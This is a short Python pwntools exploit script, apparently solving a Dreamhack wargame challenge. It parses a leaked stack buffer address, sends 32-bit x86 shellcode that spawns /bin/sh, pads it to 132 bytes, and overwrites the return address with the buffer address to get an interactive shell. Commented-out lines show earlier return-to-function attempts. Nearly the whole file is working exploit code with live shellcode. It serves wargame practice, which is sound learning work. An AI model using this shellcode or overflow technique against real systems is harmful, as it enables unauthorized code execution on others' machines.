from pwn import process, remote, context, p32, p64, gdb

#a * 84 + asdf
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdf

REMOTE = True
context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']

if REMOTE:
 p = remote('host3.dreamhack.games',9145)
else:
 p = process('./a.out')

p.recvuntil(b'(')
bufadd = p.recvuntil(b')')[2:-1]
print(bufadd)
bufadd = int(bufadd.decode(), 16)
print(bufadd)
pplus = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
pload = pplus + b'a'*(132-len(pplus))
print(pload)

#print(b'a' * 0x84 + p64(0x080485b9))
#p.send(b'a' * 0x84 + p64(0x080485b9))
p.send(pload+p32(bufadd))
#gdb.attach(p, gdbscript=f'''
#      attach {p.__getattr__('pid')}
#       ''')
#p.send(b'a' * 0x88 + p32(0x080485b9))
p.interactive()

